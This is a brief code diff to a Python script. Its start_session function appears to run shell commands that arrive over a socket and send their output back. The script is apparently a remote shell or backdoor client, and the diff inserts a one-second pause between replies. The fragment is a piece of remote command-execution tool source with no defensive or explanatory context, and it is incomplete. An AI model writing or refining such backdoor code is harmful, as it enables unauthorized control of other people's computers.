@@ -31,6 +31,7 @@ def start_session(s):
                     pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                     output = pipe.stdout.read()
                     s.send("DONE".encode())
+                    sleep(1)
                     s.send(output.encode())
                 except Exception as e:
                     print("[*] Shell execution failed")
